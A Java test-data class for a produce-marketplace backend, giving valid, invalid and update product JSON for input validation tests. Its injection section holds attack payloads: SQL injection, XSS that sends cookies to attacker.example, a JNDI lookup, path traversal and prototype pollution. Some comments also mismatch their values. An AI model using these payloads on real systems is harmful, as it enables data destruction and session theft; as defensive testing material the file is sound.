package dev.hope.vulcaobackend.TestingData;


import dev.hope.vulcaobackend.Models.Properties.ProductType;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;

public class ProductTestingData {

    private final String companyId;
    private final String companyName;
    private final String creatorUsername;
    private final String creatorId;

    public ProductTestingData(String companyId, String companyName,
                              String creatorUsername, String creatorId) {
        this.companyId = companyId;
        this.companyName = companyName;
        this.creatorUsername = creatorUsername;
        this.creatorId = creatorId;
    }

    public JSONObject[] getGoodProductData() throws JSONException {
        JSONObject[] goodData = new JSONObject[8];

        // 0: Plain ASCII, standard fresh fruit
        goodData[0] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(30).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Fuji Apples")
                .put("description", "Crisp sweet apples sourced from local orchards")
                .put("pricePerUnit", 250)
                .put("unitType", "POUND")
                .put("currency", "AED")
                .put("stock", 500)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        // 1: Minimum boundary - stock 1, price 1
        goodData[1] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(7).toString())
                .put("productType", "FRESH_VEGETABLE")
                .put("name", "Heirloom Carrot")
                .put("description", "Single organic heirloom carrot")
                .put("pricePerUnit", 1)
                .put("unitType", "PIECE")
                .put("currency", "AFN")
                .put("stock", 1)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        // 2: Long shelf life, kilogram unit, large stock
        goodData[2] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusYears(5).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Dried Apricots")
                .put("description", "Premium sun-dried apricots, hand-selected and packed")
                .put("pricePerUnit", 1850)
                .put("unitType", "KILOGRAM")
                .put("currency", "ALL")
                .put("stock", 25000)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        // 3: International characters in name and description (French)
        goodData[3] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusMonths(3).toString())
                .put("productType", "FRESH_VEGETABLE")
                .put("name", "Pommes de Terre Bretonnes")
                .put("description", "Pommes de terre françaises de la région de Bretagne, cultivées selon les méthodes traditionnelles")
                .put("pricePerUnit", 350)
                .put("unitType", "GRAM")
                .put("currency", "AMD")
                .put("stock", 5000)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        // 4: Bulk packaging, pallet
        goodData[4] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusMonths(2).toString())
                .put("productType", "FRESH_VEGETABLE")
                .put("name", "Russet Potatoes Bulk")
                .put("description", "Wholesale russet potatoes for restaurants and food service operations")
                .put("pricePerUnit", 8500)
                .put("unitType", "PALLET")
                .put("currency", "AED")
                .put("stock", 40)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        // 5: Premium high-price low-stock
        goodData[5] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(45).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Yubari King Melon")
                .put("description", "Limited stock of premium Japanese melons, gift-grade quality")
                .put("pricePerUnit", 250000)
                .put("unitType", "PIECE")
                .put("currency", "AFN")
                .put("stock", 6)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        // 6: Liquid product, bottled
        goodData[6] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusYears(2).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Fresh Squeezed Orange Juice")
                .put("description", "100% pure orange juice, never frozen, pasteurized for safety")
                .put("pricePerUnit", 599)
                .put("unitType", "BOTTLE")
                .put("currency", "ALL")
                .put("stock", 300)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        // 7: Long-but-valid name and description
        goodData[7] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(14).toString())
                .put("productType", "FRESH_VEGETABLE")
                .put("name", "Premium Organic Mixed Greens Salad Blend")
                .put("description", "A carefully curated mix of organic baby spinach, arugula, butter lettuce, and red leaf lettuce. Triple-washed and ready to eat.")
                .put("pricePerUnit", 799)
                .put("unitType", "PACKET")
                .put("currency", "AMD")
                .put("stock", 150)
                .put("creatorId", creatorId)
                .put("companyId", companyId);

        return goodData;
    }

    public JSONObject[] getBadProductData() throws JSONException {
        JSONObject[] badData = new JSONObject[40];

        // ==================== MISSING REQUIRED FIELDS ====================

        // 0: Missing expirationDate
        badData[0] = new JSONObject()
                .put("productType", "FRESH_FRUIT")
                .put("name", "No Expiration Field")
                .put("description", "expirationDate key entirely omitted")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 1: Missing productType
        badData[1] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("name", "No Product Type")
                .put("description", "productType key omitted")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 2: Missing name
        badData[2] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("description", "name key omitted")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 3: Missing pricePerUnit
        badData[3] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "No Price")
                .put("description", "pricePerUnit key omitted")
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 4: Missing currency
        badData[4] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "No Currency")
                .put("description", "currency key omitted")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 5: Missing unitType
        badData[5] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "No Unit Type")
                .put("description", "unitType key omitted")
                .put("pricePerUnit", 100)
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 6: Missing stock
        badData[6] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "No Stock")
                .put("description", "stock key omitted")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 7: Empty JSON object - all fields missing
        badData[7] = new JSONObject();

        // ==================== EXPLICIT JSON NULLS ====================

        // 8: name is JSON null
        badData[8] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", JSONObject.NULL)
                .put("description", "Explicit null name field")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 9: pricePerUnit is JSON null
        badData[9] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Null Price")
                .put("description", "Price set to JSON null")
                .put("pricePerUnit", JSONObject.NULL)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 10: All required fields explicitly null
        badData[10] = new JSONObject()
                .put("expirationDate", JSONObject.NULL)
                .put("productType", JSONObject.NULL)
                .put("name", JSONObject.NULL)
                .put("description", JSONObject.NULL)
                .put("pricePerUnit", JSONObject.NULL)
                .put("unitType", JSONObject.NULL)
                .put("currency", JSONObject.NULL)
                .put("stock", JSONObject.NULL)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // ==================== EMPTY / WHITESPACE STRINGS ====================

        // 11: Empty name
        badData[11] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "")
                .put("description", "Empty string name")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 12: Whitespace-only name (tests trim-then-validate logic)
        badData[12] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "   \t\n  ")
                .put("description", "Whitespace-only name")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 13: Empty description
        badData[13] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Empty Description")
                .put("description", "")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // ==================== DATE VIOLATIONS ====================

        // 14: Already-expired (past date)
        badData[14] = new JSONObject()
                .put("expirationDate", LocalDate.now().minusDays(30).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Expired Apples")
                .put("description", "Expiration date 30 days in the past")
                .put("pricePerUnit", 100)
                .put("unitType", "POUND")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 15: Wrong date format (US-style instead of ISO)
        badData[15] = new JSONObject()
                .put("expirationDate", "12/31/2027")
                .put("productType", "FRESH_FRUIT")
                .put("name", "Wrong Date Format")
                .put("description", "Uses MM/DD/YYYY instead of ISO-8601")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 16: Garbage in date field
        badData[16] = new JSONObject()
                .put("expirationDate", "not-a-date")
                .put("productType", "FRESH_FRUIT")
                .put("name", "Garbage Date")
                .put("description", "Non-parseable date string")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 17: Impossible date (Feb 30)
        badData[17] = new JSONObject()
                .put("expirationDate", "2027-02-30")
                .put("productType", "FRESH_FRUIT")
                .put("name", "Feb 30")
                .put("description", "Calendar-impossible date")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 18: Far-future year (potential overflow / display issues)
        badData[18] = new JSONObject()
                .put("expirationDate", "9999-12-31")
                .put("productType", "FRESH_FRUIT")
                .put("name", "Year 9999")
                .put("description", "Tests upper bound of year handling")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // ==================== INVALID ENUMS ====================

        // 19: productType not in enum set
        badData[19] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FROZEN_PIZZZA")
                .put("name", "Wrong Product Type")
                .put("description", "productType outside the allowed enum")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 20: Lowercase enum (case-sensitivity check)
        badData[20] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "fresh_fruit")
                .put("name", "Lowercase Enum")
                .put("description", "Lowercase variant of valid enum")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 21: unitType not in enum set
        badData[21] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Bad Unit")
                .put("description", "unitType set to nonsense")
                .put("pricePerUnit", 100)
                .put("unitType", "BARREL_OF_MONKEYS")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 22: Currency not a valid ISO-4217 code
        badData[22] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Bad Currency")
                .put("description", "Currency code not in ISO-4217")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "ZZZ")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // ==================== NUMERIC BOUNDARY VIOLATIONS ====================

        // 23: Negative price
        badData[23] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Negative Price")
                .put("description", "Pay customers to take the product")
                .put("pricePerUnit", -500)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 24: Zero price
        badData[24] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Free Lunch")
                .put("description", "pricePerUnit is zero")
                .put("pricePerUnit", -10)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 25: Negative stock
        badData[25] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Negative Stock")
                .put("description", "Stock below zero")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", -50)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 26: Price as a enum
        badData[26] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Overflow Price")
                .put("description", "Price exceeds 32-bit signed int")
                .put("pricePerUnit", ProductType.ALMOND_FLOUR)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 27: Price as a string
        badData[27] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Fractional Price")
                .put("description", "Price as a float, not an int")
                .put("pricePerUnit", "99.99fdg")
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10.5)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // ==================== INJECTION ATTACKS ====================

        // 28: SQL injection in name
        badData[28] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Apples'); DROP TABLE products;--")
                .put("description", "Classic SQLi attempt in the name field")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 29: Stored XSS in description
        badData[29] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "XSS Test")
                .put("description", "<script>fetch('https://attacker.example/'+document.cookie)</script>")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 30: Img-onerror XSS variant + HTML injection
        badData[30] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "<img src=x onerror=alert(1)>")
                .put("description", "<iframe src=\"javascript:alert('xss')\"></iframe>")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 31: NoSQL / template / path-traversal payloads
        badData[31] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "${jndi:ldap://attacker.example/x}")
                .put("description", "../../../../etc/passwd  {{7*7}}  {\"$ne\":null}")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // ==================== LENGTH AND ENCODING ATTACKS ====================

        // 32: Massively oversized name (10k chars)
        badData[32] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "A".repeat(10_000))
                .put("description", "Tests upper bound on name length")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 33: Embedded null byte and control characters
        badData[33] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Apples\u0000 Hidden")
                .put("description", "Bell:\u0007 Backspace:\u0008 Escape:\u001B")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 34: RTL override and zero-width characters (display spoofing)
        badData[34] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Apple\u202E\u200Bfake\u200B")
                .put("description", "Right-to-left override + zero-width spaces to spoof rendering")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 35: 4-byte UTF-8 (supplementary plane) - breaks utf8mb3 columns
        badData[35] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "🍎🍏🥝🍇🍊 Fruit Mix 𝕏𝔻𝔻")
                .put("description", "Emoji and mathematical alphanumeric symbols force utf8mb4")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // ==================== TYPE CONFUSION ====================

        // 36: Price as a string
        badData[36] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Price As String")
                .put("description", "pricePerUnit shipped as a quoted string")
                .put("pricePerUnit", "199kl0")
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 37: Stock as a boolean
        badData[37] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Stock As Bool")
                .put("description", "stock is a boolean instead of an integer")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", true)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 38: Name as an array (collection where scalar expected)
        badData[38] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", new JSONArray().put("Apples").put("Oranges"))
                .put("description", "name is an array, not a string")
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 39: Description as a nested object (mass-assignment / pollution attempt)
        badData[39] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "FRESH_FRUIT")
                .put("name", "Object Description")
                .put("description", new JSONObject()
                        .put("text", "real description")
                        .put("isAdmin", true)
                        .put("__proto__", new JSONObject().put("polluted", true)))
                .put("pricePerUnit", 100)
                .put("unitType", "PIECE")
                .put("currency", "AED")
                .put("stock", 10)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        return badData;
    }

    public JSONObject[] getProductUpdateData() throws JSONException {
        JSONObject[] updateData = new JSONObject[8];

        // 0: Herb - short shelf life, bunch unit
        updateData[0] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(5).toString())
                .put("productType", "FRESH_HERB")
                .put("name", "Fresh Greenhouse Basil")
                .put("description", "Aromatic greenhouse-grown basil with bright fragrance, harvested at peak flavor")
                .put("pricePerUnit", 199)
                .put("unitType", "BUNDLE")
                .put("currency", "ANG")
                .put("stock", 80)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);



        // 1: Mushroom - ounce unit, mid-tier price
        updateData[1] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(10).toString())
                .put("productType", "MUSHROOM")
                .put("name", "Shiitake Mushrooms")
                .put("description", "Fresh shiitake mushrooms with earthy umami flavor, ideal for stir-fries and broths")
                .put("pricePerUnit", 475)
                .put("unitType", "OUNCE")
                .put("currency", "AOA")
                .put("stock", 220)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 2: Beef - premium cut, case packaging, high price
        updateData[2] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(21).toString())
                .put("productType", "FRESH_BEEF")
                .put("name", "Dry-Aged Ribeye Steak")
                .put("description", "28-day dry-aged ribeye, USDA Prime grade, cut to 1.5 inch thickness")
                .put("pricePerUnit", 12500)
                .put("unitType", "CASE")
                .put("currency", "ARS")
                .put("stock", 18)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 3: Chicken - whole bird, piece unit
        updateData[3] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(4).toString())
                .put("productType", "FRESH_CHICKEN")
                .put("name", "Whole Free-Range Chicken")
                .put("description", "Free-range whole chicken, approximately 1.8 kilograms, air-chilled and never frozen")
                .put("pricePerUnit", 1899)
                .put("unitType", "PIECE")
                .put("currency", "AUD")
                .put("stock", 95)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 4: Ground meat - tray unit, bulk-friendly stock
        updateData[4] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(3).toString())
                .put("productType", "GROUND_MEAT")
                .put("name", "Ground Turkey 93/7")
                .put("description", "Lean ground turkey, 93 percent lean and 7 percent fat, packed in family-size trays")
                .put("pricePerUnit", 649)
                .put("unitType", "TRAY")
                .put("currency", "AWG")
                .put("stock", 340)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 5: Game meat - specialty item, very low stock, high price
        updateData[5] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(14).toString())
                .put("productType", "FRESH_GAME_MEAT")
                .put("name", "Wild-Harvested Venison Loin")
                .put("description", "Wild-harvested venison backstrap, sustainably sourced from licensed game farms")
                .put("pricePerUnit", 18750)
                .put("unitType", "POUND")
                .put("currency", "AZN")
                .put("stock", 3)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 6: Microgreens - very short shelf life, gram unit
        updateData[6] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(6).toString())
                .put("productType", "MICROGREENS")
                .put("name", "Pea Shoot Microgreens")
                .put("description", "Tender pea shoots, sweet and crisp, harvested at 10 days. Use within 5 days of delivery")
                .put("pricePerUnit", 1299)
                .put("unitType", "GRAM")
                .put("currency", "BAM")
                .put("stock", 60)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        // 7: Salad kit - box unit, mid-range, longer expiration
        updateData[7] = new JSONObject()
                .put("expirationDate", LocalDate.now().plusDays(12).toString())
                .put("productType", "SALAD_KIT")
                .put("name", "Caesar Salad Kit with Croutons")
                .put("description", "Complete Caesar kit: romaine, shaved parmesan, garlic croutons, and house-made dressing packet")
                .put("pricePerUnit", 549)
                .put("unitType", "BOX")
                .put("currency", "BBD")
                .put("stock", 175)
                .put("creatorUsername", creatorUsername)
                .put("creatorId", creatorId)
                .put("updatedBy", creatorUsername)
                .put("companyId", companyId)
                .put("companyName", companyName);

        return updateData;
    }
}